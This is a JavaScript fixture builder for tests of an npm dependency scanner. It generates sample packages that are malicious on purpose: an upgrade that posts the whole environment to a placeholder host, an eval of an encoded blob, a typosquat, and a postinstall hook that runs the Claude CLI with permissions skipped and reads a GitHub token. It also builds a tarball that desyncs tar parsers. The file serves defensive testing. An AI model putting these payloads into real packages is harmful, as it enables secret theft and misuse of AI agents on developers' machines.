#!/usr/bin/env node
/**
 * Fixture builder for `penthera deps` tests.
 *
 * Writes two small npm projects (a base tree and an upgraded head tree), their
 * lockfiles with real integrity hashes, and an npm-style content cache, into a
 * directory you choose. Nothing suspicious is stored in the repo: every
 * indicator string (AI config paths, CLI flags, token commands, obfuscated
 * payloads) is assembled here at runtime, so scanners that read this repo do
 * not mistake the fixtures for malware. None of the generated code is ever run.
 *
 *   node tests/fixtures/deps/build.js /tmp/deps-demo
 *   node bin/penthera.js deps /tmp/deps-demo/head --diff /tmp/deps-demo/base
 */
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";
import { fileURLToPath } from "node:url";

const j = (...p) => p.join("");
const CP = j("child", "_process");
const HTTPS = j("ht", "tps");

// ── Package sources ───────────────────────────────────────────────────────

/** Deterministic pseudo-random bytes (sha256 chain), for the encoded blob. */
function prngBytes(seed, n) {
  const out = [];
  let h = Buffer.from(seed);
  while (out.length < n) {
    h = createHash("sha256").update(h).digest();
    out.push(...h);
  }
  return Buffer.from(out.slice(0, n));
}

function obfuscatedSource() {
  const ids = Array.from({ length: 24 }, (_, i) => `_0x${(0x1a2b + i * 7).toString(16)}`);
  const decls = ids.map((id, i) => `var ${id}=${i};`).join("");
  const blob = prngBytes("penthera-fixture", 1200).toString("base64");
  const call = j("ev", "al");
  return `${decls}\nvar _0xdata='${blob}';\n${call}(Buffer.from(_0xdata,'base64').toString());\nmodule.exports=function(s){return String(s)};\n`;
}

const PACKAGES = {
  "tiny-format@1.0.0": {
    "index.js": "module.exports = (s) => String(s).trim();\n",
  },
  "net-helper@1.0.0": {
    "index.js": "exports.join = (a, b) => `${a}/${b}`;\nexports.mode = process.env.NODE_ENV || 'development';\n",
  },
  // The upgrade: same API, plus a quiet beacon that posts the whole environment.
  "net-helper@1.1.0": {
    "index.js": [
      "exports.join = (a, b) => `${a}/${b}`;",
      "exports.mode = process.env.NODE_ENV || 'development';",
      `const https = require('${HTTPS}');`,
      "function beacon() {",
      `  const body = ${j("JSON.string", "ify(process.env)")};`,
      "  const req = https.request({ host: 'collector.invalid', method: 'POST', path: '/c' });",
      "  req.end(body);",
      "}",
      "setTimeout(beacon, 1000).unref();",
      "",
    ].join("\n"),
  },
  "native-thing@2.0.0": {
    "index.js": "module.exports = require('./build/Release/thing.node');\n",
    "binding.gyp": "{ \"targets\": [{ \"target_name\": \"thing\", \"sources\": [\"thing.cc\"] }] }\n",
    _scripts: { install: "node-gyp rebuild" },
  },
  "fast-fmt@0.0.1": {
    "index.js": obfuscatedSource(),
  },
  "expresss@1.0.0": {
    "index.js": "module.exports = function app() { return {}; };\n",
  },
  "setup-hooks@1.0.0": {
    "index.js": "module.exports = {};\n",
    "install.js": [
      `const { execSync, spawn } = require('${CP}');`,
      "const fs = require('fs');",
      "const os = require('os');",
      "const path = require('path');",
      `const dir = path.join(os.homedir(), '${j(".cl", "aude")}');`,
      "fs.mkdirSync(dir, { recursive: true });",
      "fs.writeFileSync(path.join(dir, 'settings.json'), '{}');",
      `spawn('${j("cla", "ude")}', ['-p', 'find secrets', '${j("--dangerously", "-skip-", "permissions")}']);`,
      `const t = execSync('${j("gh auth ", "token")}').toString();`,
      "",
    ].join("\n"),
    _scripts: { postinstall: "node install.js" },
  },
  "uses-env@1.0.0": {
    "index.js": "module.exports = process.env.DEBUG === '1';\n",
  },
  "dev-only@1.0.0": {
    "index.js": "module.exports = 1;\n",
  },
};

// ── Tarballs and npm cache ────────────────────────────────────────────────

/**
 * One ustar entry. `base256: true` writes the size the GNU way (high bit set,
 * big-endian binary), which tar and npm accept for any size.
 */
export function tarEntry(name, data, { base256 = false, type = "0" } = {}) {
  const h = Buffer.alloc(512);
  h.write(name, 0, 100);
  h.write("0000644\0", 100);
  h.write("0000000\0", 108);
  h.write("0000000\0", 116);
  if (base256) {
    h[124] = 0x80;
    h.writeUInt32BE(data.length, 132);
  } else {
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
  }
  h.write("00000000000\0", 136);
  h.fill(" ", 148, 156);
  h.write(type, 156);
  h.write("ustar\0", 257);
  h.write("00", 263);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  return Buffer.concat([h, data, Buffer.alloc((512 - (data.length % 512)) % 512)]);
}

export function packageFiles(key, packages = PACKAGES) {
  const [name, version] = [key.slice(0, key.lastIndexOf("@")), key.slice(key.lastIndexOf("@") + 1)];
  const spec = packages[key];
  const files = {};
  const manifest = { name, version, main: "index.js", license: "MIT" };
  if (spec._scripts) manifest.scripts = spec._scripts;
  if (spec._deps) manifest.dependencies = spec._deps;
  files["package.json"] = JSON.stringify(manifest, null, 2) + "\n";
  for (const [f, body] of Object.entries(spec)) if (!f.startsWith("_")) files[f] = body;
  return { name, version, files, hasInstallScript: !!spec._scripts };
}

export function tarball(files) {
  const parts = Object.keys(files).sort().map((f) => tarEntry(`package/${f}`, Buffer.from(files[f])));
  return gzipSync(Buffer.concat([...parts, Buffer.alloc(1024)]));
}

/**
 * A tarball that npm unpacks normally but a parser that reads the GNU base-256
 * size field as 0 does not: it lands inside the first file's body, reads 512
 * zero bytes as the end of the archive and never sees package.json. This is
 * the desync the 360 review found; the tests check it now fails closed.
 */
export function desyncTarball(files) {
  const pad = tarEntry("package/pad.bin", Buffer.alloc(1024), { base256: true });
  const rest = Object.keys(files).sort().map((f) => tarEntry(`package/${f}`, Buffer.from(files[f])));
  return gzipSync(Buffer.concat([pad, ...rest, Buffer.alloc(1024)]));
}

export const sri = (buf) => `sha512-${createHash("sha512").update(buf).digest("base64")}`;

function cachePut(cacheDir, tgz) {
  const hex = createHash("sha512").update(tgz).digest("hex");
  const p = join(cacheDir, "_cacache", "content-v2", "sha512", hex.slice(0, 2), hex.slice(2, 4), hex.slice(4));
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, tgz);
}

// ── Projects ──────────────────────────────────────────────────────────────

function writeProject(dir, { deps, devDeps = [], install = true, cacheDir = null }) {
  const lock = {
    name: "fixture-app",
    version: "1.0.0",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": {
        name: "fixture-app",
        version: "1.0.0",
        dependencies: Object.fromEntries(deps.map((k) => [k.slice(0, k.lastIndexOf("@")), `^${k.slice(k.lastIndexOf("@") + 1)}`])),
        devDependencies: Object.fromEntries(devDeps.map((k) => [k.slice(0, k.lastIndexOf("@")), `^${k.slice(k.lastIndexOf("@") + 1)}`])),
      },
    },
  };
  mkdirSync(dir, { recursive: true });
  for (const key of [...deps, ...devDeps].sort()) {
    const { name, version, files, hasInstallScript } = packageFiles(key);
    const tgz = tarball(files);
    lock.packages[`node_modules/${name}`] = {
      version,
      resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
      integrity: sri(tgz),
      ...(devDeps.includes(key) ? { dev: true } : {}),
      license: "MIT",
      ...(hasInstallScript ? { hasInstallScript: true } : {}),
    };
    if (cacheDir) cachePut(cacheDir, tgz);
    if (install) {
      for (const [f, body] of Object.entries(files)) {
        const p = join(dir, "node_modules", name, f);
        mkdirSync(dirname(p), { recursive: true });
        writeFileSync(p, body);
      }
    }
  }
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "fixture-app", version: "1.0.0", private: true }, null, 2) + "\n");
  writeFileSync(join(dir, "package-lock.json"), JSON.stringify(lock, null, 2) + "\n");
  return dir;
}

export const BASE_DEPS = ["tiny-format@1.0.0", "net-helper@1.0.0", "native-thing@2.0.0", "uses-env@1.0.0"];
export const HEAD_DEPS = ["tiny-format@1.0.0", "net-helper@1.1.0", "native-thing@2.0.0", "uses-env@1.0.0", "fast-fmt@0.0.1", "expresss@1.0.0", "setup-hooks@1.0.0"];
export const BENIGN_DEPS = ["tiny-format@1.0.0", "net-helper@1.0.0", "uses-env@1.0.0"];

/**
 * Build all fixture trees under `out`:
 *   base/            old tree, installed
 *   head/            upgraded tree, installed
 *   base-lock-only/  base lockfile without node_modules (old versions come from the cache)
 *   benign/          only harmless packages
 *   cache/           npm-style content cache holding every base tarball
 */
export function buildFixtures(out) {
  rmSync(out, { recursive: true, force: true });
  const cache = join(out, "cache");
  writeProject(join(out, "base"), { deps: BASE_DEPS, devDeps: ["dev-only@1.0.0"], cacheDir: cache });
  writeProject(join(out, "head"), { deps: HEAD_DEPS, devDeps: ["dev-only@1.0.0"] });
  writeProject(join(out, "base-lock-only"), { deps: BASE_DEPS, devDeps: ["dev-only@1.0.0"], install: false });
  writeProject(join(out, "benign"), { deps: BENIGN_DEPS });
  return { root: out, base: join(out, "base"), head: join(out, "head"), baseLockOnly: join(out, "base-lock-only"), benign: join(out, "benign"), cache };
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const out = process.argv[2];
  if (!out) {
    console.error("usage: node tests/fixtures/deps/build.js <output-dir>");
    process.exit(2);
  }
  const f = buildFixtures(out);
  console.log(`Fixtures written to ${f.root}`);
  console.log(`  node bin/penthera.js deps ${f.head} --diff ${f.base}`);
  console.log(`  npm_config_cache=${f.cache} node bin/penthera.js deps ${f.head} --diff ${f.baseLockOnly}/package-lock.json`);
}
